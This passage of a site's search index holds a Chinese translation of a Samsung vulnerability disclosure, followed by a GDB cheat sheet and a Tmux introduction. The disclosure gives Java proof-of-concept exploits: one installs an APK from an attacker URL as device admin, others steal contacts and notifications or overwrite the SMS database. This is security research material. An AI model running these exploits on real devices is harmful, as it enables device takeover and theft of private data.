str)) { return; }","title":"\u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u6f0f\u6d1e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_7","text":"\u8fd9\u4e2a\u6982\u5ff5\u8bc1\u660e\u662f\u901a\u8fc7\u590d\u5236 ProvisioningParams.Builder \u7c7b\u7684\u4ee3\u7801\u5e76\u4f20\u9012\u914d\u7f6e\u6258\u7ba1\u4f9b\u5e94\u6240\u9700\u7684\u6807\u51c6\u53c2\u6570\u6765\u6784\u5efa\u7684\uff0c\u5176\u4e2d\u5305\u62ec\uff1a \u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u7684 URL \u6587\u4ef6\u7684 SHA1 \u54c8\u5e0c\u503c \u5728 \u8bbe\u5907\u7ba1\u7406\u63a5\u6536\u673a \u7ec4\u4ef6\u540d\u79f0 byte[] hash = Base64.decode(\"5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ\", 0); PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder() .setLocation(\"https://redacted.s3.amazonaws.com/app-release.apk\") .setPackageChecksum(hash) .setSignatureChecksum(hash); ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder() .setSkipUserConsent(true) .setDeviceAdminComponentName(new ComponentName(\"test.exampleapp\", \"test.exampleapp.MyReceiver\")) .setDeviceAdminPackageName(\"test.exampleapp\") .setProvisioningAction(\"android.app.action.PROVISION_MANAGED_DEVICE\") .setDeviceAdminDownloadInfo(infoBuiler.build()); ProvisioningParams params = builder.build(); Intent i = new Intent(\"com.android.managedprovisioning.action.RESUME_PROVISIONING\"); i.setClassName(\"com.android.managedprovisioning\", \"com.android.managedprovisioning.preprovisioning.PreProvisioningActivity\"); i.putExtra(\"provisioningParams\", params); i.putExtra(\"com.samsung.knox.container.requestId\", 1); i.putExtra(\"com.samsung.knox.container.configType\", \"knox-do-basic\"); startActivity(i); \u6253\u5f00\u5e94\u7528\u7a0b\u5e8f\u540e\uff0c\u53d1\u751f\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a Managed Provisioning \u88ab\u8feb\u4ece\u653b\u51fb\u8005\u6307\u5b9a\u7684\u94fe\u63a5\u4e0b\u8f7d\u6076\u610f\u5e94\u7528\u7a0b\u5e8f \u6b65\u9aa4 1 \u4e2d\u5b89\u88c5\u7684\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u88ab\u8bbe\u7f6e\u4e3a\u5177\u6709\u4efb\u610f\u6743\u9650\u7684\u8bbe\u5907\u7ba1\u7406\u5458 \u542f\u52a8\u4e86\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u8be5\u8fc7\u7a0b\u5c06\u5220\u9664\u5b89\u88c5\u5728\u540c\u4e00\u8bbe\u5907\u4e0a\u7684\u6240\u6709\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u653b\u51fb\u770b\u8d77\u6765\u662f\u8fd9\u6837\u7684\uff1a","title":"\u7528\u4e8e\u5b89\u88c5\u81ea\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e3a\u5176\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u6982\u5ff5\u8bc1\u660e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_8","text":"\u5b89\u5168\u6587\u4ef6\u5939\u662f\u9884\u88c5\u5728\u4e09\u661f\u8bbe\u5907\u4e0a\u7684\u5b89\u5168\u6587\u4ef6\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u62e5\u6709\u5927\u91cf\u6743\u9650\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u5728\u8bbf\u95ee \u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u7a0b\u5e8f\u4e2d \u53d1\u73b0\u7684\u6f0f\u6d1e\u6765\u62e6\u622a\u8fd9\u4e9b\u6743\u9650\uff1a \u4e00\u65e6\u653b\u51fb\u8005\u6536\u5230\u4ed6\u4eec\u53d1\u9001\u7684\u610f\u56fe\uff0c\u4ed6\u4eec\u5c31\u80fd\u591f\u62e6\u622a\u6743\u9650\u3002 \u4f5c\u4e3a PoC\uff0c\u6211\u4eec\u62e6\u622a\u4e86\u8bfb/\u5199\u8054\u7cfb\u4eba\u7684\u6743\u9650\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent i = new Intent(); i.setClassName(\"com.samsung.knox.securefolder\", \"com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity\"); i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); i.setData(ContactsContract.RawContacts.CONTENT_URI); startActivityForResult(i, 0); } protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); dump(data.getData()); } private void dump(Uri uri) { Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i < cursor.getColumnCount(); i++) { if (sb.length() > 0) { sb.append(\", \"); } sb.append(cursor.getColumnName(i) + \" = \" + cursor.getString(i)); } Log.d(\"evil\", sb.toString()); } while (cursor.moveToNext()); } }","title":"\u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u6f0f\u6d1e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#secsettings","text":"SecSettings \u662f\u4e09\u661f\u9884\u88c5\u7684\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u3002 \u4ece UID 1000 ( system )\u8bfb\u53d6\u548c\u5199\u5165\u4efb\u610f\u6587\u4ef6\u7684\u6f0f\u6d1e\u7531\u4e24\u4e2a\u7ec4\u4ef6\u7ec4\u6210\uff1a \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005 \u5728 com.sec.imsservice \u5e94\u7528\u7a0b\u5e8f\u4e2d\u5229\u7528\u4e0d\u5b89\u5168\u7684 FileProvider \u8fd9\u4e2a\u94fe\u662f\u552f\u4e00\u53ef\u80fd\u7684\uff0c\u56e0\u4e3a\u4e24\u4e2a\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f7f\u7528\u5728\u5b83\u4eec\u7684 AndroidManifest.xml : \u4e2d\u6307\u5b9a\u7684\u76f8\u540c\u5171\u4eab UID android:sharedUserId=\"android.uid.system\" \u3002\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u8bbe\u7f6e\u610f\u5473\u7740\u4e24\u4e2a\u4e0d\u540c\u7684\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5b8c\u5168\u5171\u4eab\u6240\u6709\u8d44\u6e90\uff0c\u5e76\u4e14\u53ef\u4ee5\u5b8c\u5168\u8bbf\u95ee\u5f7c\u6b64\u7684\u7ec4\u4ef6\u3002SecSettings \u4e2d\u7684\u6f0f\u6d1e\u662f Google \u7684\u3002\u5b83\u5df2\u62a5\u544a\u7ed9 Android VDP\u3002\u5956\u91d1\u4e3a2000\u7f8e\u5143\u3002\u6211\u4eec\u5c06\u5728\u7b2c 2 \u90e8\u5206\u6587\u7ae0\u4e2d\u62ab\u9732\u6b64\u95ee\u9898\u7684\u8be6\u7ec6\u4fe1\u606f\u3002","title":"SecSettings \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#dex-ui","text":"\u6b64\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005 \u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e \uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u5305\u62ec Telegram\u3001Google Docs \u6587\u4ef6\u5939\u3001\u4e09\u661f\u7535\u5b50\u90ae\u4ef6\u548c Gmail \u6536\u4ef6\u7bb1\u7684\u804a\u5929\u63cf\u8ff0\uff0c\u4ee5\u53ca\u6765\u81ea\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u901a\u77e5\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u6fc0\u6d3b\u8be5\u529f\u80fd\u5728 SD \u5361\u4e0a\u7684\u5168\u5c40\u53ef\u8bfb\u76ee\u5f55\u4e2d\u521b\u5efa\u5907\u4efd\uff1a \u7531\u4e8e\u6587\u4ef6\u5728\u521b\u5efa\u5907\u4efd\u540e\u7acb\u5373\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6211\u4eec\u6dfb\u52a0\u4e86\u521b\u5efa\u5907\u4efd\u526f\u672c\u7684\u529f\u80fd\u4ee5\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a final File root = Environment.getExternalStorageDirectory(); final File policyFile = new File(root, \"notification_policy.xml\"); final File backupCopy = new File(root, \"backup\"); Intent i = new Intent(\"com.samsung.android.intent.action.REQUEST_BACKUP_NOTIFICATION\"); i.setClassName(\"com.samsung.desktopsystemui\", \"com.samsung.desktopsystemui.NotificationBackupRestoreManager$NotificationBnRReceiver\"); i.putExtra(\"SAVE_PATH\", root.getAbsolutePath()); i.putExtra(\"SESSION_KEY\", \"not_empty\"); sendBroadcast(i); new Thread(() -> { while (true) { if(policyFile.exists()) { try { InputStream i = new FileInputStream(policyFile); OutputStream o = new FileOutputStream(backupCopy); IOUtils.copy(i, o); i.close(); o.close(); } catch (Throwable th) { throw new RuntimeException(th); } } } }).start();","title":"\u4e09\u661f DeX \u7cfb\u7edf UI \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#telephonyui","text":"\u63a5\u6536\u5668 com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver \u88ab\u5bfc\u51fa\u3002\u5b83\u5c06\u6587\u4ef6\u4ece \u4e2d\u6307\u5b9a\u7684 URL \u4fdd\u5b58\u5230 \u4e2d\u6307\u5b9a photoring_uri \u7684\u8def\u5f84 down_file \u3002\u8fd9\u662f\u7531\u8fc7\u5ea6\u5b89\u5168\u7684 Android \u626b\u63cf\u4eea\u68c0\u6d4b\u5230\u7684\uff1a \u552f\u4e00\u7684\u8981\u6c42\u662f\u670d\u52a1\u5668\u54cd\u5e94\u7684\u5185\u5bb9\u7c7b\u578b\u5e94\u8be5\u662f image/* or video/* \u3002\u56e0\u6b64\uff0c\u6211\u4eec\u4f7f\u7528\u6587\u4ef6\u540d test.mp4 \uff0cAmazon S3 \u81ea\u52a8\u6307\u5b9a video/mp4 \u54cd\u5e94\u4e2d\u7684\u5185\u5bb9\u7c7b\u578b\u3002 \u6982\u5ff5\u8bc1\u660e\uff1a File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Intent i = new Intent(\"com.samsung.android.app.telephonyui.action.DOWNLOAD_PHOTORING\"); i.setClassName(\"com.samsung.android.app.telephonyui\", \"com.samsung.android.app.telephonyui.carrierui.photoring.model.PhotoringReceiver\"); i.putExtra(\"photoring_uri\", \"https://redacted.s3.amazonaws.com/test.mp4\"); i.putExtra(\"down_file\", dbPath.getAbsolutePath()); sendBroadcast(i); \u7ed3\u679c\uff0c\u5e26\u6709 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\u88ab\u653b\u51fb\u8005\u63a7\u5236\u7684\u5185\u5bb9\u8986\u76d6\u3002","title":"TelephonyUI \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#phototable","text":"\u5728 PhotoTable \u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86 Intent redirection \uff0c\u5b83\u5141\u8bb8\u5bf9\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u88ab\u62e6\u622a\uff1a \u6211\u4eec\u5229\u7528\u8be5\u6f0f\u6d1e\u52ab\u6301\u4e86\u8bbf\u95ee SD \u5361\u7684\u6743\u9650\u3002\u8fd9\u662f\u6982\u5ff5\u8bc1\u660e\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); handle(getIntent()); } protected void onNewIntent(Intent intent) { super.onNewIntent(intent); handle(intent); } private void handle(Intent intent) { if(\"evil\".equals(intent.getAction())) { String uri = MediaStore.Images.Media.insertImage(getContentResolver(), Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888), \"Title_1337\", \"Description_1337\"); Log.d(\"evil\", \"Result: \" + uri); } else { Intent next = new Intent(\"evil\", MediaStore.Images.Media.EXTERNAL_CONTENT_URI); next.setFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION); next.setClass(this, getClass()); Intent i = new Intent(); i.setClassName(\"com.android.dreams.phototable\", \"com.android.dreams.phototable.PermissionsRequestActivity\"); i.putExtra(\"previous_intent\", next); i.putExtra(\"permission_list\", new String[0]); startActivity(i); } } from \u539f\u6587\u94fe\u63a5\uff1a https://www.ddosi.org/cve-2021-25356/","title":"PhotoTable \u4e2d\u7684\u6f0f\u6d1e"},{"location":"Bash/gdbcomm/","text":"GDB commands by function - simple guide More important commands have a (*) by them. Startup % gdb -help print startup help, show switches *% gdb object normal debug *% gdb object core core debug (must specify core file) %% gdb object pid attach to running process % gdb use file command to load object Help *(gdb) help list command classes (gdb) help running list commands in one command class (gdb) help run bottom-level help for a command \"run\" (gdb) help info list info commands (running program state) (gdb) help info line help for a particular info command (gdb) help show list show commands (gdb state) (gdb) help show commands specific help for a show command Breakpoints *(gdb) break main set a breakpoint on a function *(gdb) break 101 set a breakpoint on a line number *(gdb) break basic.c:101 set breakpoint at file and line (or function) *(gdb) info breakpoints show breakpoints *(gdb) delete 1 delete a breakpoint by number (gdb) delete delete all breakpoints (prompted) (gdb) clear delete breakpoints at current line (gdb) clear function delete breakpoints at function (gdb) clear line delete breakpoints at line (gdb) disable 2 turn a breakpoint off, but don't remove it (gdb) enable 2 turn disabled breakpoint back on (gdb) tbreak function|line set a temporary breakpoint (gdb) commands break-no ... end set gdb commands with breakpoint (gdb) ignore break-no count ignore bpt N-1 times before activation (gdb) condition break-no expression break only if condition is true (gdb) condition 2 i == 20 example: break on breakpoint 2 if i equals 20 (gdb) watch expression set software watchpoint on variable (gdb) info watchpoints show current watchpoints Running the program *(gdb) run run the program with current arguments *(gdb) run args redirection run with args and redirection (gdb) set args args... set arguments for run (gdb) show args show current arguments to run *(gdb) cont continue the program *(gdb) step single step the program; step into functions (gdb) step count singlestep \\fIcount\\fR times *(gdb) next step but step over functions (gdb) next count next \\fIcount\\fR times *(gdb) CTRL-C actually SIGINT, stop execution of current program *(gdb) attach process-id attach to running program *(gdb) detach detach from running program *(gdb) finish finish current function's execution (gdb) kill kill current executing program Stack backtrace *(gdb) bt print stack backtrace (gdb) frame show current execution position (gdb) up move up stack trace (towards main) (gdb) down move down stack trace (away from main) *(gdb) info locals print automatic variables in frame (gdb) info args print function parameters Browsing source *(gdb) list 101 list 10 lines around line 101 *(gdb) list 1,10 list lines 1 to 10 *(gdb) list main list lines around function *(gdb) list basic.c:main list from another file basic.c *(gdb) list - list previous 10 lines (gdb) list *0x22e4 list source at address (gdb) cd dir change current directory to \\fIdir\\fR (gdb) pwd print working directory (gdb) search regexpr forward current for regular expression (gdb) reverse-search regexpr backward search for regular expression (gdb) dir dirname add directory to source path (gdb) dir reset source path to nothing (gdb) show directories show source path Browsing Data *(gdb) print expression print expression, added to value history *(gdb) print/x expressionR print in hex (gdb) print array[i]@count artificial array - print array range (gdb) print $ print last value (gdb) print *$->next print thru list (gdb) print $1 print value 1 from value history (gdb) print ::gx force scope to be global (gdb) print 'basic.c'::gx global scope in named file (>=4.6) (gdb) print/x &main print address of function (gdb) x/countFormatSize address low-level examine command (gdb) x/x &gx print gx in hex (gdb) x/4wx &main print 4 longs at start of \\fImain\\fR in hex (gdb) x/gf &gd1 print double (gdb) help x show formats for x *(gdb) info locals print local automatics only (gdb) info functions regexp print function names (gdb) info variables regexp print global variable names *(gdb) ptype name print type definition (gdb) whatis expression print type of expression *(gdb) set variable = expression assign value (gdb) display expression display expression result at stop (gdb) undisplay delete displays (gdb) info display show displays (gdb) show values print value history (>= gdb 4.0) (gdb) info history print value history (gdb 3.5) Object File manipulation (gdb) file object load new file for debug (sym+exec) (gdb) file discard sym+exec file info (gdb) symbol-file object load only symbol table (gdb) exec-file object specify object to run (not sym-file) (gdb) core-file core post-mortem debugging Signal Control (gdb) info signals print signal setup (gdb) handle signo actions set debugger actions for signal (gdb) handle INT print print message when signal occurs (gdb) handle INT noprint don't print message (gdb) handle INT stop stop program when signal occurs (gdb) handle INT nostop don't stop program (gdb) handle INT pass allow program to receive signal (gdb) handle INT nopass debugger catches signal; program doesn't (gdb) signal signo continue and send signal to program (gdb) signal 0 continue and send no signal to program Machine-level Debug (gdb) info registers print registers sans floats (gdb) info all-registers print all registers (gdb) print/x $pc print one register (gdb) stepi single step at machine level (gdb) si single step at machine level (gdb) nexti single step (over functions) at machine level (gdb) ni single step (over functions) at machine level (gdb) display/i $pc print current instruction in display (gdb) x/x &gx print variable gx in hex (gdb) info line 22 print addresses for object code for line 22 (gdb) info line *0x2c4e print line number of object code at address (gdb) x/10i main disassemble first 10 instructions in \\fImain\\fR (gdb) disassemble addr dissassemble code for function around addr History Display (gdb) show commands print command history (>= gdb 4.0) (gdb) info editing print command history (gdb 3.5) (gdb) ESC-CTRL-J switch to vi edit mode from emacs edit mode (gdb) set history expansion on turn on c-shell like history (gdb) break class::member set breakpoint on class member. may get menu (gdb) list class::member list member in class (gdb) ptype class print class members (gdb) print *this print contents of this pointer (gdb) rbreak regexpr useful for breakpoint on overloaded member name Miscellaneous (gdb) define command ... end define user command *(gdb) RETURN repeat last command *(gdb) shell command args execute shell command *(gdb) source file load gdb commands from file *(gdb) quit quit gdb","title":"Gdbcomm"},{"location":"Bash/gdbcomm/#gdb-commands-by-function-simple-guide","text":"More important commands have a (*) by them. Startup % gdb -help print startup help, show switches *% gdb object normal debug *% gdb object core core debug (must specify core file) %% gdb object pid attach to running process % gdb use file command to load object Help *(gdb) help list command classes (gdb) help running list commands in one command class (gdb) help run bottom-level help for a command \"run\" (gdb) help info list info commands (running program state) (gdb) help info line help for a particular info command (gdb) help show list show commands (gdb state) (gdb) help show commands specific help for a show command Breakpoints *(gdb) break main set a breakpoint on a function *(gdb) break 101 set a breakpoint on a line number *(gdb) break basic.c:101 set breakpoint at file and line (or function) *(gdb) info breakpoints show breakpoints *(gdb) delete 1 delete a breakpoint by number (gdb) delete delete all breakpoints (prompted) (gdb) clear delete breakpoints at current line (gdb) clear function delete breakpoints at function (gdb) clear line delete breakpoints at line (gdb) disable 2 turn a breakpoint off, but don't remove it (gdb) enable 2 turn disabled breakpoint back on (gdb) tbreak function|line set a temporary breakpoint (gdb) commands break-no ... end set gdb commands with breakpoint (gdb) ignore break-no count ignore bpt N-1 times before activation (gdb) condition break-no expression break only if condition is true (gdb) condition 2 i == 20 example: break on breakpoint 2 if i equals 20 (gdb) watch expression set software watchpoint on variable (gdb) info watchpoints show current watchpoints Running the program *(gdb) run run the program with current arguments *(gdb) run args redirection run with args and redirection (gdb) set args args... set arguments for run (gdb) show args show current arguments to run *(gdb) cont continue the program *(gdb) step single step the program; step into functions (gdb) step count singlestep \\fIcount\\fR times *(gdb) next step but step over functions (gdb) next count next \\fIcount\\fR times *(gdb) CTRL-C actually SIGINT, stop execution of current program *(gdb) attach process-id attach to running program *(gdb) detach detach from running program *(gdb) finish finish current function's execution (gdb) kill kill current executing program Stack backtrace *(gdb) bt print stack backtrace (gdb) frame show current execution position (gdb) up move up stack trace (towards main) (gdb) down move down stack trace (away from main) *(gdb) info locals print automatic variables in frame (gdb) info args print function parameters Browsing source *(gdb) list 101 list 10 lines around line 101 *(gdb) list 1,10 list lines 1 to 10 *(gdb) list main list lines around function *(gdb) list basic.c:main list from another file basic.c *(gdb) list - list previous 10 lines (gdb) list *0x22e4 list source at address (gdb) cd dir change current directory to \\fIdir\\fR (gdb) pwd print working directory (gdb) search regexpr forward current for regular expression (gdb) reverse-search regexpr backward search for regular expression (gdb) dir dirname add directory to source path (gdb) dir reset source path to nothing (gdb) show directories show source path Browsing Data *(gdb) print expression print expression, added to value history *(gdb) print/x expressionR print in hex (gdb) print array[i]@count artificial array - print array range (gdb) print $ print last value (gdb) print *$->next print thru list (gdb) print $1 print value 1 from value history (gdb) print ::gx force scope to be global (gdb) print 'basic.c'::gx global scope in named file (>=4.6) (gdb) print/x &main print address of function (gdb) x/countFormatSize address low-level examine command (gdb) x/x &gx print gx in hex (gdb) x/4wx &main print 4 longs at start of \\fImain\\fR in hex (gdb) x/gf &gd1 print double (gdb) help x show formats for x *(gdb) info locals print local automatics only (gdb) info functions regexp print function names (gdb) info variables regexp print global variable names *(gdb) ptype name print type definition (gdb) whatis expression print type of expression *(gdb) set variable = expression assign value (gdb) display expression display expression result at stop (gdb) undisplay delete displays (gdb) info display show displays (gdb) show values print value history (>= gdb 4.0) (gdb) info history print value history (gdb 3.5) Object File manipulation (gdb) file object load new file for debug (sym+exec) (gdb) file discard sym+exec file info (gdb) symbol-file object load only symbol table (gdb) exec-file object specify object to run (not sym-file) (gdb) core-file core post-mortem debugging Signal Control (gdb) info signals print signal setup (gdb) handle signo actions set debugger actions for signal (gdb) handle INT print print message when signal occurs (gdb) handle INT noprint don't print message (gdb) handle INT stop stop program when signal occurs (gdb) handle INT nostop don't stop program (gdb) handle INT pass allow program to receive signal (gdb) handle INT nopass debugger catches signal; program doesn't (gdb) signal signo continue and send signal to program (gdb) signal 0 continue and send no signal to program Machine-level Debug (gdb) info registers print registers sans floats (gdb) info all-registers print all registers (gdb) print/x $pc print one register (gdb) stepi single step at machine level (gdb) si single step at machine level (gdb) nexti single step (over functions) at machine level (gdb) ni single step (over functions) at machine level (gdb) display/i $pc print current instruction in display (gdb) x/x &gx print variable gx in hex (gdb) info line 22 print addresses for object code for line 22 (gdb) info line *0x2c4e print line number of object code at address (gdb) x/10i main disassemble first 10 instructions in \\fImain\\fR (gdb) disassemble addr dissassemble code for function around addr History Display (gdb) show commands print command history (>= gdb 4.0) (gdb) info editing print command history (gdb 3.5) (gdb) ESC-CTRL-J switch to vi edit mode from emacs edit mode (gdb) set history expansion on turn on c-shell like history (gdb) break class::member set breakpoint on class member. may get menu (gdb) list class::member list member in class (gdb) ptype class print class members (gdb) print *this print contents of this pointer (gdb) rbreak regexpr useful for breakpoint on overloaded member name Miscellaneous (gdb) define command ... end define user command *(gdb) RETURN repeat last command *(gdb) shell command args execute shell command *(gdb) source file load gdb commands from file *(gdb) quit quit gdb","title":"GDB commands by function - simple guide"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/","text":"\u4f18\u96c5\u5730\u4f7f\u7528\u547d\u4ee4\u884c\uff1aTmux \u7ec8\u7aef\u590d\u7528 \u4f60\u662f\u5426\u66fe\u7ecf\u5f00\u8fc7\u4e00\u5927\u5806\u7684 Terminal\uff1f\u6709\u6ca1\u6709\u628a\u5b83\u4eec\u90fd\u4fdd\u5b58\u4e0b\u6765\u7684\u51b2\u52a8\uff1f Tmux \u7684Session\u5c31\u662f\u505a\u8fd9\u4ef6\u4e8b\u60c5\u7684\uff01 \u4f60\u53ef\u4ee5\u968f\u65f6\u9000\u51fa\u6216\u8005\u8fdb\u5165\u4efb\u4f55\u4e00\u4e2a Session\u3002\u6bcf\u4e2a Session \u6709\u82e5\u5e72\u4e2a Window\uff0c\u6bcf\u4e2a Window \u53c8\u53ef\u4ee5\u5206\u6210\u591a\u4e2a\u7a97\u683c\uff08Pane\uff09\u3002 \u6781\u5927\u5730\u6ee1\u8db3 Terminal \u7528\u6237\u7684\u9700\u6c42\u3002 \u6b64\u5916\u5373\u4f7f iTerm/Terminal/Konsole \u610f\u5916\u5173\u95ed\u4e5f\u6ca1\u5173\u7cfb\uff0c\u56e0\u4e3a Session \u5b8c\u5168\u4fdd\u5b58\u5728 Tmux Server \u4e2d\u3002 \u518d\u6b21\u6253\u5f00 Terminal \u65f6\u53ea\u9700 tmux attach \u4fbf\u53ef\u56de\u5230\u4f60\u7684\u5de5\u4f5c\u533a\uff0c\u5c31\u50cf\u4ece\u672a\u9000\u51fa\u8fc7\u4e00\u6837\u3002 \u5982\u679c\u5e0c\u671b\u91cd\u542f\u7535\u8111\u540e\u4ecd\u7136\u751f\u6548\uff0c\u4f60\u53ef\u80fd\u9700\u8981 \u52a8\u624b\u5199\u811a\u672c \u6216\u8005 \u4f7f\u7528\u63d2\u4ef6 \u3002 \u4ec0\u4e48\u662f Tmux Tmux \u662f\u4e00\u4e2a BSD \u534f\u8bae\u53d1\u5e03\u7684\u7ec8\u7aef\u590d\u7528\u8f6f\u4ef6\uff0c\u7528\u6765\u5728\u670d\u52a1\u5668\u7aef\u6258\u7ba1\u540c\u65f6\u8fd0\u884c\u7684 Shell\u3002\u90a3\u4e48 Tmux \u7528\u8d77\u6765\u662f\u600e\u6837\u7684\u5462\uff1f\u770b\u56fe\uff1a Tmux \u6700\u7ecf\u5178\u7684\u4f7f\u7528\u573a\u666f\u4fbf\u662f\u7528 Tmux+Vim \u6765\u505a\u4e00\u4e2aIDE\uff0c\u5176\u4e2dVim\u90e8\u5206\u7684\u914d\u7f6e\u8fc7\u7a0b\u8bb0\u5f55\u5728\u4e86 \u8fd9\u91cc \u3002 \u672c\u6587\u4ecb\u7ecdTmux\u7684\u5b89\u88c5\u914d\u7f6e\uff0c\u4ee5\u53ca\u5e38\u89c1\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u5f0f\u3002 iTerm \u7684\u7a97\u683c\u548c Tmux \u6709\u4ec0\u4e48\u533a\u522b\uff1f iTerm\u662f\u4e00\u4e2aGUI\u8f6f\u4ef6\uff0c\u5b83\u7684\u7a97\u683c\u53ea\u662f\u7a97\u683c\u800c\u5df2\uff01\u800cTmux\u662f\u7ec8\u7aef\u590d\u7528\uff0c\u5728\u4e00\u4e2a\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\u4e0d\u4ec5\u53ef\u4ee5\u663e\u793a\u591a\u4e2aShell\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u6301\u591a\u4e2a\u4f1a\u8bdd\u3002 \u6700\u91cd\u8981\u7684\u662f\uff1aTmux\u548cVim\u4e00\u6837\u5c5e\u4e8e\u5b57\u7b26\u7ec8\u7aef\u8f6f\u4ef6\uff0c\u4e0d\u9700\u8981\u4efb\u4f55GUI\u7684\u652f\u6301\uff0c\u5728\u8fdc\u7a0b\u767b\u5f55\u65f6\u5c24\u5176\u6709\u7528\u3002 \u7ec8\u7aef\u548c Shell \u6709\u4ec0\u4e48\u533a\u522b\uff1f\u8bf7\u53c2\u8003 Shell\u7684\u76f8\u5173\u6982\u5ff5\u548c\u914d\u7f6e\u65b9\u6cd5 \u3002 Tmux \u548c screen \u6709\u4ec0\u4e48\u533a\u522b\uff1f \u8fd9\u4e24\u4e2a\u90fd\u662f\u505a\u7ec8\u7aef\u590d\u7528\u7684\uff0c\u6211\u5728\u963f\u91cc\u4e91 ECS \u4e0a \u642d\u5efaNode.js API\u670d\u52a1\u5668 \u65f6\u7528\u8fc7 screen \uff0c\u5b83\u662f GNU \u8f6f\u4ef6\uff0c\u800c Tmux \u662f BSD \u7684\u534f\u8bae\u3002 \u5b83\u4eec\u6700\u4e3b\u8981\u7684\u533a\u522b\u662f Tmux \u652f\u6301 Vi/Emacs 